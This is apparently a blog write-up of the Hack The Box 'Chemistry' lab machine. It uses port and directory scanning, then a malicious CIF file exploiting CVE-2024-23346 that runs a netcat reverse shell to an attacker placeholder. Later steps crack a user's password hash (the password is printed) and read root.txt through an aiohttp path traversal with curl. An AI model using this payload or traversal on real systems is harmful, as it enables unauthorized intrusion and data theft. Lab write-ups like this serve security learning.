---
title: Chemistry
layout: post
post-image: "/assets/images/Rooms/HTB/Chemistry/Chemistry.png"
description: "The Chemistry machine on Hack The Box is vulnerable to various techniques, such as command injection, LFI, and vulnerabilities in CIF file handling. Through these vulnerabilities, a reverse shell was executed, privileges were escalated, and the flags user.txt and root.txt were obtained."
difficulty: Easy
skills:
  - Command Injection
  - LFI
  - CIF files vulnerability
  - Database Analysis and Exploration
  - Hash cracking
enlace: https://app.hackthebox.com/machines/631
os: Linux
---
First, I'm going to perform a port scanning in order to find out which ports are open:
<div style="text-align:center;">
 <div class="code-container">
    <div class="code-header">
      Bash
      <button class="copy-button" data-code="bash">Copy</button>
    </div>
    <pre><code class="language-bash">sudo nmap -sS --open -p- -Pn -n -vvv --min-rate 5000 &lt;target_IP&gt;</code></pre>
  </div>
</div>

<div style="text-align: center;">
  <img src="/assets/images/Rooms/HTB/Chemistry/1.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>
We have the following ports open → 22, 5000 and 8089. So our next step is to perform a exhaustive scan to find out the versions and additional information about the discovered ports:
<div style="text-align:center;">
 <div class="code-container">
    <div class="code-header">
      Bash
      <button class="copy-button" data-code="bash">Copy</button>
    </div>
    <pre><code class="language-bash">sudo nmap -sCV &lt;target_IP&gt;</code></pre>
  </div>
</div>

<table>
  <tr>
    <th>
      <div style="text-align: center;">
        <img src="/assets/images/Rooms/HTB/Chemistry/2.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
      </div>
    </th>
    <th>
      <div style="text-align: center;">
        <img src="/assets/images/Rooms/HTB/Chemistry/3.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
      </div>
    </th>
  </tr>
</table>

As you can see above, port 22 is a <em>SSH</em> service, port 5000 scan result gives us information related to a web application and port 8089 we don't know what it is at the moment.

As we don't have valid credentials to perform a login via <em>SSH</em>, we are going to check the web application on port 5000:

<div style="text-align: center;">
  <img src="/assets/images/Rooms/HTB/Chemistry/5.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>

At first glance we are not able to see interesting information. So let's fuzzing the web to find out some hidden directories.

We can use either <code>Gobuster</code>, <code>Wfuzz</code> or other fuzzer to do this task. I used <code>Gobuster</code>, for instance.
<div style="text-align:center;">
 <div class="code-container">
    <div class="code-header">
      Bash
      <button class="copy-button" data-code="bash">Copy</button>
    </div>
    <pre><code class="language-bash">gobuster dir -u &lt;http://target_IP&gt; -w &lt;path_to_wordlist&gt;</code></pre>
  </div>
</div>

<div style="text-align: center;">
  <img src="/assets/images/Rooms/HTB/Chemistry/6.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>

Nice! We found a hidden directory called <em>/login</em> and <em>/register</em>:

<table>
  <tr>
    <th>
      <div style="text-align: center;">
        <img src="/assets/images/Rooms/HTB/Chemistry/7.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
      </div>
    </th>
    <th>
      <div style="text-align: center;">
        <img src="/assets/images/Rooms/HTB/Chemistry/8.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
      </div>
    </th>
  </tr>
</table>

We can proceed by registering a new account, where we will find text that says 'An example is available here'. Clicking on it will download a <code>.cif</code> file.

A <strong>CIF</strong> file is a <em>Crystallographic Information File</em>. You can read more about it <a href="https://en.wikipedia.org/wiki/Crystallographic_Information_File" target="_blank">here!</a>


<div style="text-align: center;">
  <img src="/assets/images/Rooms/HTB/Chemistry/9.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
  <p>This is the <code>.cif</code> file.</p>
</div>

Now, we can search on Google for information about any vulnerability related with this kind of file.

<div style="text-align: center;">
  <img src="/assets/images/Rooms/HTB/Chemistry/10.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>

I found this <a href="https://github.com/9carlo6/CVE-2024-23346" target="_blank">GitHub repository</a>, where you can find a <code>.cif</code> file that contains the exploit.

The methodology is to embed a <em>reverse shell</em> (by specifying the VPN IP and listener port) inside the file to gain access to the victim machine.

<div style="text-align:center;">
  <div class="code-container" style="max-width: 100%; overflow-x: auto;">
    <div class="code-header">
      Bash
      <button class="copy-button" data-code="bash">Copy</button>
    </div>
    <pre style="white-space: pre-wrap; word-wrap: break-word; overflow-wrap: break-word;"><code class="language-bash">_space_group_magn.transform_BNS_Pp_abc 'a,b,[d for d in ().__class__.__mro__[1].__getattribute__( *[().__class__.__mro__[1]]+ ["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("busybox nc &lt;Attacker_IP&gt; &lt;Listener_Port&gt; -e /bin/bash");0,0,0'</code></pre>
  </div>
</div>

We modify the script and upload the file to the system. At the same time, we listen on the port we specified in the script with <code>Netcat</code>, and if we press the button that says 'View', the reverse shell will be triggered:

<table>
  <tr>
    <th>
      <div style="text-align: center;">
        <img src="/assets/images/Rooms/HTB/Chemistry/11.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
      </div>
    </th>
    <th>
      <div style="text-align: center;">
        <img src="/assets/images/Rooms/HTB/Chemistry/12.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
      </div>
    </th>
  </tr>
</table>

After that, we are inside the server, so the next step is to find out where the <em>user flag<em> is.

<div style="text-align: center;">
  <img src="/assets/images/Rooms/HTB/Chemistry/13.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>

The <em>user flag<em> is located in the user <strong>rosa</strong> directory, but if we perform a <code>cat</code> to visualize the content, an error will be displayed saying that we don't have the required permissions.

We can confirm this by using <code>ls -la</code>, and since we are the app user, we belong to the other group for that file, so we cannot open it.

<div style="text-align: center;">
  <img src="/assets/images/Rooms/HTB/Chemistry/14.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>

As a conclusion, we need to pivot to user <strong>rosa</strong> to visualize the content of the <em>user flag</em>. To achieve this, we need to find information on a privilege escalation vector that allows us to pivot to that user.

By navigating through directories we find a database, which may can contain credentials of the system users. So, if we convert this file into a <em>base64</em> string, we can copy it to our machine in order to see what it contains.
<table>
  <tr>
    <td>
      <div style="text-align: center;">
        <img src="/assets/images/Rooms/HTB/Chemistry/15.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
        <p>We convert the file into a base64 string</p>
      </div>
    </td>
    <td>
      <div style="text-align: center;">
        <img src="/assets/images/Rooms/HTB/Chemistry/16.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
        <p>We decrypt the base64 string into its normal state</p>
      </div>
    </td>
  </tr>
</table>

After that, we have the database on our machine without any problems. We can check the file's integrity by using <code>md5sum</code> on both machines. If the hash is the same, the file hasn't changed during the transfer.

Now, we can use the <code>sqlite3</code> tool to view the tables of the database.

By using an <em>SQL</em> query, we can list the users from a table:

<div style="text-align:center;">
 <div class="code-container">
    <div class="code-header">
      SQL
      <button class="copy-button" data-code="SQL">Copy</button>
    </div>
    <pre><code class="language-bash" >SELECT * FROM &lt;table_name&gt;</code></pre>
  </div>
</div>

<div style="text-align: center;">
  <img src="/assets/images/Rooms/HTB/Chemistry/17.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>
Awesome, we have information about users and their passwords, which are hashed. So, we need to decrypt them for a potential connection via <em>SSH</em>.

To decrypt the passwords, we can user either <code>JohnTheRipper</code> or <code>Hashcat</code>.

Before all of that, we store the hash of the user <strong>rosa</strong> in a '.txt' file and then proceed to decrypt the password.

<div style="text-align:center;">
 <div class="code-container">
    <div class="code-header">
      Bash
      <button class="copy-button" data-code="bash">Copy</button>
    </div>
    <pre><code class="language-bash">hashcat -m 0 -a 0 rosa.txt /usr/share/wordlist/rockyou.txt;</code></pre>
  </div>
</div>


<div style="text-align: center;">
  <img src="/assets/images/Rooms/HTB/Chemistry/18.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
  <p>We got the rosa's password, and its credentials are → <strong>rosa:unicorniosrosados</strong>.</p>
</div>

Now, with these credentials, we can perform a connection via <em>SSH</em> as <strong>rosa</strong> user:

<table>
  <th>
    <td>
      <div style="text-align: center;">
        <img src="/assets/images/Rooms/HTB/Chemistry/19.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
        <p>We stablish the <em>SSH</em> connection</p>
      </div>
    </td>
    <td>
      <div style="text-align: center;">
        <img src="/assets/images/Rooms/HTB/Chemistry/20.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
        <p>The <em>user flag</em> is located on the user' home directory</p>
      </div>
    </td>
  </th>
</table>

After getting the <em>user flag</em>, we need to obtain the <em>root flag</em>. To achieve this, we need to find a privilege escalation vector.

We can perform a <code>sudo -l</code> to check if the user <strong>rosa</strong> can execute commands as sudo, but no luck.

<div style="text-align: center;">
  <img src="/assets/images/Rooms/HTB/Chemistry/21.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>

Also, we can check the binaries with the SUID bit set, by using the following command → <code>find / -perm -4000 2>/dev/null | xargs ls -l</code>:

<div style="text-align: center;">
  <img src="/assets/images/Rooms/HTB/Chemistry/22.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>

We also did not find an unusual binary with the SUID bit set, so we can use <code>linpeas.sh</code> in order to find vulnerabilities on the machine.

We can find this script in rosa's user <em>/home</em> directory:

<div style="text-align: center;">
  <img src="/assets/images/Rooms/HTB/Chemistry/23.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>

Let's execute the <code>linpeas.sh</code> script:

<div style="text-align: center;">
  <img src="/assets/images/Rooms/HTB/Chemistry/24.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>

If we use this script, we can find that there are several ports open that are not visible from outside. That is, we can see these ports if we are on the victim machine but not on our own.

Another way to find this information is by using this command → <code>netstat -tulnp | grep -i listen</code>.

Knowing this, we see that something is running on port 8080. We can use the <code>curl</code> command to check whether it is a web application or not.

<div style="text-align: center;">
  <img src="/assets/images/Rooms/HTB/Chemistry/25.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>

After reading the headers of the request, we confirm that we are dealing with a web application.

Thanks to that, we have the server version and the status of the request headers. Therefore, we can look for vulnerabilities in this website by using this exploit → <a href="https://github.com/z3rObyte/CVE-2024-23334-PoC" target="_blank">CVE-2024-23334-PoC</a>.

A good practice is to see what the exploit does to understand how it works. So, let's check the exploit using <code>cat</code> command:

<div style="text-align: center;">
  <img src="/assets/images/Rooms/HTB/Chemistry/26.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>

As you can see, the command executes a <em>path traversal</em> to read an arbitrary file. That is, the website is vulnerable to a <strong>Local File Inclusion</strong> or <strong>LFI</strong> vulnerability.

So, instead of executing the whole script, we can perform a request using the <code>curl</code> command as follows:

<div style="text-align:center;">
 <div class="code-container">
    <div class="code-header">
      Bash
      <button class="copy-button" data-code="bash">Copy</button>
    </div>
    <pre><code class="language-bash">curl --path-as-is http://localhost:8080/assets/../../../../root/root.txt</code></pre>
  </div>
</div>

Why the <em>/root</em> directory? Because the <em>root flag</em> is located there, so if we can read this file, we can obtain the flag we desire.

<div style="text-align: center;">
  <img src="/assets/images/Rooms/HTB/Chemistry/28.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>

Done, we got the <em>root flag</em>.

---

<div style="text-align: center;">
  <a href="https://www.hackthebox.com/achievement/machine/1157775/631" target="_blank">
    <img src="/assets/images/Rooms/HTB/Chemistry/29.png" alt="Hack The Box Achievement" style="width:100%; max-width:inherit;">
  </a>
</div>
